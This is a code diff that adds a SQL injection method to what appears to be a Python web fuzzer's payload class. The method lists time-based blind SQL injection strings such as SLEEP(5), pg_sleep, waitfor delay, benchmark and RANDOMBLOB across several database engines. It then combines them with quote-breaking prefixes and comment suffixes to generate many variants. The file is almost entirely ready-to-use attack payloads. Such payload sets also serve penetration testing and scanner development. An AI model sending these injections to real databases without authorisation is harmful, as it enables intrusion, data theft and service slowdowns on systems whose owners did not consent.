@@ -450,3 +450,80 @@ class fuzzer_payloads:
             "\"});sleep(10000);",
             "'});sleep(10000);",
         ]
+
+
+    @staticmethod
+    def SQLInjection():
+        
+        SQLtimepay=[
+        '1-SLEEP(5)',
+        'sleep(5)',
+        ";waitfor delay '0:0:5'--",
+        "pg_sleep(5)--",
+        "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
+        "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
+        "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "SLEEP(5)",
+        "waitfor delay '00:00:05'",
+        "benchmark(50000000,MD5(1))",
+        "pg_SLEEP(5)", # postgrsSQL
+        "AnD SLEEP(5)",
+        "&&SLEEP(5)",
+        "'AnD SLEEP(5) ANd '1",
+        "'&&SLEEP(5)&&'1",
+        "ORDER BY SLEEP(5)",
+        "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
+        "+benchmark(3200,SHA1(1))+'",
+        "+ SLEEP(10) + '",
+        "RANDOMBLOB(500000000/2)",
+        "2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "RANDOMBLOB(1000000000/2)",
+        "2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+        "2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+        "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
+        ]
+
+        TimeFront=[
+        "'",
+        '"',
+        '`',
+        '`',
+        ')',
+        '))',
+        'or',
+        '1 or',
+        "' or",
+        '" or',
+        '1) or',
+        "') or", 
+        '") or', 
+        '1)) or', 
+        "')) or",
+        '")) or' 
+
+        ]
+
+        TimeRear=[
+        "'",
+        '"',
+        "-",
+        "='",
+        '="',
+        "#"
+        ]
+        
+    
+        TimeQuery=[]
+        for pay in SQLtimepay:
+            TimeQuery.append(pay)
+            for front in TimeFront:
+                TimeQuery.append(front+' '+pay)
+            for rear in TimeRear:
+                TimeQuery.append(pay+' '+rear)
+                for front in TimeFront:
+                    if pay.startswith(front)==False:  
+                        if pay.startswith(rear)==False:
+                            TimeQuery.append(front+' '+pay+' '+rear)
+        
+        return TimeQuery
